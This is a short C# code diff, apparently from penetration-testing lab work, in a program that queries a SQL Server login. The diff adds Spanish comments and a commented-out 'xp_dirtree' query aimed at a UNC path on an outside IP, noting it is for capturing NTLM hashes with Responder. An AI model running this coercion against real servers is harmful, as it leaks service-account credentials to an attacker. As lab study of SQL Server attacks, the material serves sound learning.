@@ -25,6 +25,9 @@ namespace SQL
             }
             // Se ejecuta query para obtener el usuario
             String querylogin = "SELECT SYSTEM_USER;";
+            // Usar esta para explotar UNC - Obtener ntml con responder, poner mi IP
+            // String query = "EXEC master..xp_dirtree \"\\\\192.168.119.120\\\\test\";";
+            
             SqlCommand command = new SqlCommand(querylogin, con);
             SqlDataReader reader = command.ExecuteReader();
 
